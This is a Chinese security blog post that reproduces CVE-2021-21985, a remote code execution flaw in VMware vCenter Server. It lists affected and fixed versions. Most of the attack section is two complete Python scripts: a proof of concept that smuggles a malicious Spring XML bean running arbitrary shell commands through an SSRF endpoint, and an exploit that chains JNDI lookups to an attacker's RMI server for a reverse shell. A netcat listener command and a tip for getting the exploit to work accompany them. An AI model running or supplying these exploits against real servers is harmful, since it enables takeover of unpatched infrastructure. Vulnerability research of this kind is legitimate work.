<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_4YyfYvxmjg9s49ucsUt8Q)

**上方蓝色字体关注我们，一起学安全！**

**作者：daxi0ng****@Timeline Sec  
**

**本文字数：3018**

**阅读时长：4～5min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

_VMware_ _vCenter_ _Server_ 服务器是一种高级服务器管理软件，它为控制 vsphere 环境提供了一个集中式平台，以便在混合云中实现可见性。

**0x02 漏洞概述**  

  

**编号：CVE-2021-21985**

该漏洞存在于 vSphere Client（HTML5）中，由于 vCenter Server 中默认启用的 Virtual SAN Health Check 插件缺乏输入验证，拥有 443 端口网络访问权限的攻击者可以利用此漏洞在承载 vCenter Server 的操作系统上远程执行任意命令。

**0x03 影响版本**  

  

VMware vCenter Server:

非 7.0 U2b 版本的 7.0 版本

非 6.7 U3n 版本的 6.7 版本

非 6.5 U3p 版本的 6.5 版  

VMware Cloud Foundation:

低于 4.2.1 版本的 4.x 版本

低于 3.10.2.1 版本的 3.x 版本

**0x04 环境搭建**  

  

环境搭建可参考，此文不表

```
https://blog.csdn.net/z136370204/article/details/111719373
```

**0x05 漏洞复现**  

  

1. 首先使用 POC 执行 whoami 来测试是否存在该漏洞

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Author: r0cky
@Time: 2021/6/3-16:57
"""
import base64
import sys
import zipfile
from urllib.parse import urlparse

import zlib
import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'https':'http://127.0.0.1:8080'}

def banner():
    print("""
==============================================================
         _____           _              _____   _____ ______ 
        / ____|         | |            |  __ \ / ____|  ____|
 __   _| |     ___ _ __ | |_ ___ _ __  | |__) | |    | |__   
 \ \ / / |    / _ \ '_ \| __/ _ \ '__| |  _  /| |    |  __|  
  \ V /| |___|  __/ | | | ||  __/ |    | | \ \| |____| |____ 
   \_/  \_____\___|_| |_|\__\___|_|    |_|  \_\\_____|______|

                              Powered by r0cky Team ZionLab
==============================================================
    """)



def create_xml():

    print("[*] Create Xml to offline_bundle.xml ...")
    context = """<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
          <list>
            <value>/bin/bash</value>
            <value>-c</value>
            <value><![CDATA[ {cmd} 2>&1 ]]></value>
          </list>
        </constructor-arg>
    </bean>
    <bean id="is" class="java.io.InputStreamReader">
        <constructor-arg>
            <value>#{pb.start().getInputStream()}</value>
        </constructor-arg>
    </bean>
    <bean id="br" class="java.io.BufferedReader">
        <constructor-arg>
            <value>#{is}</value>
        </constructor-arg>
    </bean>
    <bean id="collectors" class="java.util.stream.Collectors"></bean>
    <bean id="system" class="java.lang.System">
        <property #{ system.setProperty("output", br.lines().collect(collectors.joining("\n"))) }"/>
    </bean>
</beans>
""".replace("{cmd}", cmd)
    with open('offline_bundle.xml', 'w') as wf:
        wf.write(context)
        wf.flush()

def create_zip():
    print("[*] Create Zip to offline_bundle.zip ...")
    with zipfile.ZipFile('offline_bundle.zip', 'w', zipfile.ZIP_DEFLATED) as zp:
        zp.write('offline_bundle.xml')

def toBase64():
    with open('offline_bundle.zip', 'rb') as rf:
        return base64.b64encode(rf.read())

def poc1(url):
    ssrf_str = "https://localhost:443/vsanHealth/vum/driverOfflineBundle/data:text/html%3Bbase64,{}%23"
    ssrf = ssrf_str.format(bytes.decode(toBase64()))

    print ("[*] Get XML to SystemProperties  ...")
    target = url + "/ui/h5-vsan/rest/proxy/service/vmodlContext/loadVmodlPackages"

    data = {"methodInput":[[ssrf]]}

    r = requests.post(target, data=json.dumps(data), headers=headers, verify=False, proxies=proxies)


def poc2(url):

    print("[*] getProperty   ...")
    target = url + "/ui/h5-vsan/rest/proxy/service/systemProperties/getProperty"

    data = {"methodInput": ["output", None]}

    r = requests.post(target, data=json.dumps(data), headers=headers,
                      verify=False, proxies=proxies)
    if "result" in r.json():
        print("[+] Command:", cmd)
        print(r.json()['result'])
    else:
        print ("[-] send payload failed.")

headers = {"Content-Type": "application/json"}

def main(url):
    try:
        create_xml()
        create_zip()
        poc1(url)
        poc2(url)
    except:
        print("[-] send payload failed.")

if __name__ == '__main__':
    banner()
    try:
        target = sys.argv[1]
        cmd = sys.argv[2]
        up = urlparse(target)
        target = up.scheme + "://" + up.netloc
        main(target)
    except:
        print("Example: \n\tpython3 " + sys.argv[0] + " <target> <cmd>\n")
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgX5e53c1DFS646gic8h6IcLXzz76Xb9nJrFpPL4C6m03u83sSOqlwnewFic9LHiacicGGMFNxTqybKUA/640?wx_fmt=png)  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgX5e53c1DFS646gic8h6IcLeSIO0tqY40aiackRuQ0qQu97iasN8Q8A6icuaTjPEJnboEkfpAicMRtYxQ/640?wx_fmt=png)  

该 POC 创建了一个恶意 xml 文件，打包成 zip，并 base64 后通过特定格式发送，返回包含 result 字段，及证明存在该漏洞  

2、使用 EXP 反弹 Shell

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
@Author: r0cky
@Time: 2021/6/3-16:57
"""

import sys
from urllib.parse import urlparse

import json
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies={'https':'http://127.0.0.1:8080'}


def banner():
    print("""
==============================================================
         _____           _              _____   _____ ______ 
        / ____|         | |            |  __ \ / ____|  ____|
 __   _| |     ___ _ __ | |_ ___ _ __  | |__) | |    | |__   
 \ \ / / |    / _ \ '_ \| __/ _ \ '__| |  _  /| |    |  __|  
  \ V /| |___|  __/ | | | ||  __/ |    | | \ \| |____| |____ 
   \_/  \_____\___|_| |_|\__\___|_|    |_|  \_\\_____|______|

                              Powered by r0cky Team ZionLab
==============================================================
    """)


def payload1(url):
    print ("[*] Step 1 setTargetObject to null ...")

    target = url + "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetObject"

    data = {"methodInput":[None]}

    r = requests.post(target, data=json.dumps(data), headers=headers, verify=False, proxies=proxies)

    if "result" in r.json():
        payload2(url)
    else:
        print ("[-] send payload failed1.")


def payload2(url):
    print("[*] Step 2 setStaticMethod to payload ...")

    target = url + "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setStaticMethod"

    data = {"methodInput": ["javax.naming.InitialContext.doLookup"]}

    r = requests.post(target, data=json.dumps(data), headers=headers, verify=False, proxies=proxies)

    if "result" in r.json():
        payload3(url)
    else:
        print ("[-] send payload failed2.")

def payload3(url):
    print("[*] Step 3 setTargetMethod to doLookup ...")

    target = url + "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setTargetMethod"

    data = {"methodInput": ["doLookup"]}

    r = requests.post(target, data=json.dumps(data), headers=headers, verify=False, proxies=proxies)

    if "result" in r.json():
        payload4(url)
    else:
        print ("[-] send payload failed3.")

def payload4(url):
    print("[*] Step 4 setArguments with payload args ...")

    target = url + "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/setArguments"

    data = {"methodInput": [[rmi_class]]}

    r = requests.post(target, data=json.dumps(data), headers=headers, verify=False, proxies=proxies)

    if "result" in r.json():
        payload5(url)
    else:
        print ("[-] send payload failed4.")

def payload5(url):
    print("[*] Step 5 initial payload class and methods ...")

    target = url + "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/prepare"

    data = {"methodInput": []}

    r = requests.post(target, data=json.dumps(data), headers=headers, verify=False, proxies=proxies)

    if "result" in r.json():
        payload6(url)
    else:
        print ("[-] send payload failed5.")

def payload6(url):
    print("[*] Step 6 trigger method invoke ...")

    target = url + "/ui/h5-vsan/rest/proxy/service/&vsanProviderUtils_setVmodlHelper/invoke"

    data = {"methodInput": []}

    r = requests.post(target, data=json.dumps(data), headers=headers, verify=False, proxies=proxies)

    print("[+] send payload success.")
    print()
    print("[END] VMWare vCenter RCE Done.")

headers = {"Content-Type": "application/json"}

if __name__ == '__main__':
    banner()
    try:
        target = sys.argv[1]
        rmi_class = sys.argv[2]
        up = urlparse(target)
        target = up.scheme + "://" + up.netloc
        payload1(target)
    except:
        print("Example: \n\tpython3 " + sys.argv[
            0] + " <target> <rmi://ip/class>\n")
```

首先需要启动 RMI  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgX5e53c1DFS646gic8h6IcLbQib3Z2SE5ib0Z4rjdwps19EhueoFcH2wBgRskJLDibWDia7RhE8p08h5Q/640?wx_fmt=png)

然后开启 reverse shell 监听

nc -lvnp 5555

最后执行 EXP

  
![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgX5e53c1DFS646gic8h6IcLj55FaqvA0bCUejqMicp85HPY8BP7eJlLolWnPD4OQLOpibdia6bQLAATw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgX5e53c1DFS646gic8h6IcL8YPMFmnvPibZaluxsmv7z2ZXa4SVEmdA8REAO65zay0FSRgv3RTFwSA/640?wx_fmt=png)

**注意：**复现中发现该 EXP 的 payload5 和 payload6 函数中的 None 要删掉，不然会失败  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgX5e53c1DFS646gic8h6IcLbibTgt6MjkZI2YpyySnyBribibq7zBhbiamu6C9VB8N59hjmNtjdT3wibfg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgX5e53c1DFS646gic8h6IcL3bgib2g4OgtTW8VfT4NmNY0Butl4lu1icAz5WFo8dzhFibuXFqfOeJEUQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgX5e53c1DFS646gic8h6IcLiasWNhRvO7YpiapLamHxZF7ZEXatOkSyadia2uXdTibYXKLYOJibH1431YQ/640?wx_fmt=png)

**0x06 修复方式**  

  

VMware vCenter Server:

7.0 版本升级到 7.0 U2b

6.7 版本升级到 6.7 U3n

6.5 版本升级到 6.5 U3p

VMware Cloud Foundation:

4.x 版本升级到 4.2.1

3.x 版本升级到 3.10.2.1

```
参考链接：
```

https://github.com/r0ckysec/CVE-2021-21985

https://github.com/xnianq/cve-2021-21985_exp

https://www.vmware.com/security/advisories/VMSA-2021-0010.html  

  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章**

Timeline Sec 团队  

安全路上，与你并肩前行